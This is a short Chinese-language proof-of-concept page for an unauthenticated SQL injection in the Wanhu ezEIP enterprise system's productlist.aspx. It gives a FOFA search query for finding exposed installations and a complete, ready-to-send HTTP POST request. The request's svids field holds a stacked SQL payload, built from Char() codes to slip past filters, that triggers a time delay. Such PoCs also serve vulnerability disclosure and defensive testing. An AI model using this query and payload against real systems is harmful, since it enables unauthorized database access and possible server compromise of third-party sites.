# 万户ezEIP企业管理系统productlist.aspx存在SQL注入漏洞

万户ezEIP企业管理系统productlist.aspx存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

## fofa

```javascript
body="ezEIP" || header="ezEIP" || body="css/css_whir.css"
```

## poc

```javascript
POST /shop/productlist.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

ob=price&price=asc&svids=-1%29%3BDECLARE+%40%40proc_name+VARCHAR%28301%29%3BSet+%40%40proc_name%3DChar%28115%29%252bChar%28101%29%252bChar%28108%29%252bChar%28101%29%252bChar%2899%29%252bChar%28116%29%252bChar%2832%29%252bChar%2849%29%252bChar%2832%29%252bChar%28119%29%252bChar%28104%29%252bChar%28101%29%252bChar%28114%29%252bChar%28101%29%252bChar%2832%29%252bChar%2849%29%252bChar%2861%29%252bChar%2849%29%252bChar%2832%29%252bChar%2887%29%252bChar%2865%29%252bChar%2873%29%252bChar%2884%29%252bChar%2870%29%252bChar%2879%29%252bChar%2882%29%252bChar%2832%29%252bChar%2868%29%252bChar%2869%29%252bChar%2876%29%252bChar%2865%29%252bChar%2889%29%252bChar%2832%29%252bChar%2839%29%252bChar%2848%29%252bChar%2858%29%252bChar%2848%29%252bChar%2858%29%252bChar%2853%29%252bChar%2839%29%3BEXECUTE+%28%40%40proc_name%29%3B--a%2B
```

![image-20241017144051590](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410171440685.png)